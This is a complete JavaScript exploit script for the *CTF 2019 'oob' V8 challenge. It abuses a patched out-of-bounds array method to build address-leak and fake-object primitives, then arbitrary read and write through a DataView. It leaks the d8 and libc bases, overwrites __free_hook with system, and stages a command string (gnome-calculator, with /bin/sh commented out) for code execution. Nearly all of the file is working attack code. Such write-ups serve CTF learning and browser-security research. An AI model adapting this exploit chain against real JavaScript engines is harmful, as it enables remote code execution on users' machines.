/*************************************************************
 * File Name: exp.js
 * 
 * Created on: 2019-11-26 04:35:29
 * Author: raycp
 * 
 * Last Modified: 2019-11-26 06:33:12
 * Description: exp for star ctf 2019 oob
************************************************************/
var obj = {"a": 1};
var obj_array = [obj];
var float_array = [1.1];

var obj_array_map = obj_array.oob();
var float_array_map = float_array.oob();

var buf =new ArrayBuffer(16);
var float64 = new Float64Array(buf);
var bigUint64 = new BigUint64Array(buf);
// Floating point to 64-bit unsigned integer
function f2i(f)
{
    float64[0] = f;
    return bigUint64[0];
}
// 64-bit unsigned integer to Floating point
function i2f(i)
{
    bigUint64[0] = i;
    return float64[0];
}
// 64-bit unsigned integer to hex
function hex(i)
{
    return i.toString(16).padStart(16, "0");
}


console.log("[*] leak object map: 0x" + f2i(obj_array_map).toString(16));
console.log("[*] leak float array map: 0x" + f2i(float_array_map).toString(16));

// leak address of object
function addressOf(object)
{
    obj_array[0] = object;
    obj_array.oob(float_array_map); // type confused here

    var object_addr = obj_array[0]; // leak addr

    obj_array.oob(obj_array_map); // restore the type

    return f2i(object_addr)-1n;
}

// build fake object with fake_obj_addr
function fakeObject(fake_object_addr)
{
    float_array[0] = i2f(fake_object_addr+1n);
    float_array.oob(obj_array_map);

    var fake_object = float_array[0]; // read out the fake object

    float_array.oob(float_array_map); // restore

    return fake_object;
}

//%DebugPrint(obj_array)
//console.log("[+] leak obj addr: 0x" + hex(test_leak_addr));


// fake object memory
var evil_array = [
    float_array_map,   // fake map
    0.0,            // fake properties
    i2f(0x4141414141414141n),  // fake element
    i2f(0x400000000n),    // fake length
    1.1,
    2.2
];

//%DebugPrint(evil_array);
var leak_addr = addressOf(evil_array);
console.log("[+] leak obj addr: 0x" + hex(leak_addr));
var fake_obj_addr = leak_addr - 0x40n + 0x10n;   // fake object address
var fake_obj = fakeObject(fake_obj_addr);      // get the fake object

//%DebugPrint(fake_obj);
//%SystemBreak();
function read64(addr)
{
    evil_array[2] = i2f(addr -0x10n +1n); // overwrite the element address.
    //%DebugPrint(fake_obj);
    //%SystemBreak();
    var leak_data = f2i(fake_obj[0]);

    return leak_data;
}

function write64(addr, data)
{
    evil_array[2] = i2f(addr -0x10n +1n);

    fake_obj[0] = i2f(data);

    return;
}

var data_buf = new ArrayBuffer(8);
var data_view = new DataView(data_buf);
var buf_backing_store_addr = addressOf(data_buf) + 0x20n;


// arbitrary write with dataview
function dataview_write64(addr, data)
{
    write64(buf_backing_store_addr, addr);
    data_view.setFloat64(0, i2f(data), true);
    //%SystemBreak();
    //console.log("[*] write to : 0x" +hex(addr) + ": 0x" + hex(data));
}

function get_text_address()
{
    var a = [1.1, 2.2];
    //%DebugPrint(a.constructor);
    var a_constructor_addr = addressOf(a.constructor);   
    //console.log("array map address: 0x"+hex(a_map_addr));
    var a_code_addr = read64(a_constructor_addr + 0x30n)-1n;
    //console.log("constructor addr: 0x"+hex(a_constructor_addr))
    var text_base_address = read64(a_code_addr + 0x40n)>>16n;
    //console.log("d8 text address: 0x"+hex(text_address));

    return text_base_address - 0x94f780n;
}
var text_base_address = get_text_address();
console.log("leak d8 text address: 0x"+hex(text_base_address));
var libc_start_main_got = text_base_address + 0xc2b7a0n;
var libc_start_main_addr = read64(libc_start_main_got);
var libc_base = libc_start_main_addr - 0x21ab0n;
var free_hook_addr = libc_base + 0x3ed8e8n;
var system_addr = libc_base + 0x4f440n;
console.log("free hook address: 0x"+hex(free_hook_addr));
console.log("system adrr: 0x"+hex(system_addr));
//%SystemBreak();
dataview_write64(free_hook_addr, system_addr);

function get_shell()
{
    let get_shell_buffer = new ArrayBuffer(0x1000);
    let get_shell_dataview = new DataView(get_shell_buffer);
    //get_shell_dataview.setFloat64(0, i2f(0x0068732f6e69622fn), true); // str --> /bin/sh\x00
    get_shell_dataview.setFloat64(0, i2f(0x69622f70616e732fn), true); // /snap/bi
    get_shell_dataview.setFloat64(8, i2f(0x2d656d6f6e672f6en), true); // n/gnome-
    get_shell_dataview.setFloat64(16, i2f(0x74616c75636c6163n), true); // calculat
    get_shell_dataview.setFloat64(24, i2f(0x726fn), true); // or
    //%DebugPrint(get_shell_dataview);
    //%SystemBreak();

    
}
get_shell();
//%DebugPrint(evil_array);
//%SystemBreak();

